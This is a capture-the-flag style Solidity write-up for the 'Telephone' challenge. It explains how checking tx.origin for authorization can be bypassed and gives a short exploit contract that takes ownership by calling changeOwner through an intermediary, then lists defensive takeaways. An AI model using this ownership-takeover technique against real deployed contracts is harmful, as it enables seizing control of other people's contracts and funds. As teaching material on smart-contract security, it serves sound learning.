In this challenge, you need to claim ownership of the `Telephone` contract by exploiting its `changeOwner` function.

## Hints

<Hint index={1}>
    The `changeOwner` function in the `Telephone` contract checks if `tx.origin` is different from `msg.sender`. What is the difference between `tx.origin` and `msg.sender`?
</Hint>

<Hint index={2}>
    Consider how you might call the `changeOwner` function from a different contract. How would that affect the values of `tx.origin` and `msg.sender`?
</Hint>

## Solution

<Solution>
    The `Telephone` contract's `changeOwner` function checks if `tx.origin` is different from `msg.sender` before allowing the owner to be changed. Here's the relevant part of the contract:

    ```solidity
    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
    ```

    To exploit this, you need to call the `changeOwner` function from another contract. This way, `tx.origin` will be the address that initiated the transaction (your address), and `msg.sender` will be the address of the contract that you use to call `changeOwner`.

    Here is a simple exploit contract that can achieve this:

    ```solidity
    pragma solidity ^0.6.0;

    import './Telephone.sol';

    contract TelephoneExploit {
        Telephone public telephoneContract;

        constructor(address _telephoneAddress) public {
            telephoneContract = Telephone(_telephoneAddress);
        }

        function exploit(address _newOwner) public {
            telephoneContract.changeOwner(_newOwner);
        }
    }
    ```

    Deploy this exploit contract with the address of the `Telephone` contract. Then call the `exploit` function with your address as the `_newOwner` parameter. This will change the owner of the `Telephone` contract to your address.

## Conclusion

<Conclusion>
    <Fragment slot="takeaways">
        This challenge demonstrates the importance of understanding the difference between `tx.origin` and `msg.sender`. Key takeaways include:

        1. `tx.origin` refers to the original external account that initiated the transaction, while `msg.sender` refers to the immediate account (contract or external) that called the function.
        2. Using `tx.origin` for authorization checks can be dangerous and is generally discouraged because it can be manipulated through intermediate contracts.
        3. Always prefer `msg.sender` for access control checks to ensure that the correct entity is authorized to perform actions.

        These concepts are crucial for developing secure smart contracts and preventing unauthorized access.

        The [Mist wallet](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks) used `tx.origin` for authentication, which led to a vulnerability that allowed an attacker to steal funds from users. The attacker would trick the user into interacting with a malicious contract that would call the Mist wallet contract using the user's `tx.origin`, thereby bypassing the authentication checks.
